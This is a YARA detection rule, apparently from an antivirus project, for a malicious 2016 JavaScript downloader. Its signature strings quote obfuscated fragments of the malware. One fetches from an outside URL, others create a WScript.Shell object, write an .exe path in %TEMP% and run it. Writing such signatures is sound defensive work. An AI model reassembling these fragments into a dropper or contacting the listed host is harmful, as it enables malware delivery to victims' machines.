rule sig_20160330_a8c8e2a5f250b238a5f7cc0087bc49e8 {
  meta:
    description = "datamaliciousorder - file 20160330_a8c8e2a5f250b238a5f7cc0087bc49e8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e61a33d072142ad44380e214539572dddd43255defa152c4ebed0ad0453ec96a"

  strings:
    $s1  = "_WQ[_V](\"GET\", \"http://itead-europe.com/k3ias\", false);" fullword ascii
    $s2  = "var _N0 = function _PV() {return WScript[_ZS](\"WScript\"+\".Shell\");}(), _FP = 11;" fullword ascii
    $s3  = "function _Y(_XQ, _HO){_T = _T * 1; return _XQ - _HO;};" fullword ascii
    $s4  = "if (_WQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _N(){return _WC + \"\";};" fullword ascii
    $s6  = "function _H() {return _N0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zKS5Rnn87qAceX.ex\" + \"e\";};" fullword ascii
    $s7  = "function _O(_GI){_N0[\"Run\"](_GI, _T, _T);};" fullword ascii
    $s8  = "function _MR() {return ((_E == true) && (_E == _Z)) ? 1 : _T;};" fullword ascii
    $s9  = "var _C = new this[\"Date\"]();" fullword ascii
    $s10 = "function _X()" fullword ascii
    $s11 = " while (_V0){" fullword ascii
    $s12 = "function _CW(){return _ZS;};" fullword ascii
    $s13 = "function _JW(){return 22;};" fullword ascii
    $s14 = "function _A(_QJ) {var _H0 = (1, 2, 3, 4, 5, _QJ); return _H0;};" fullword ascii
    $s15 = "return _Y(_D, _EI);" fullword ascii
    $s16 = "_Z = true; " fullword ascii
    $s17 = "var _Z = false;" fullword ascii
    $s18 = "var _E = false;" fullword ascii
    $s19 = "_E = true; " fullword ascii
    $s20 = "var _I0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}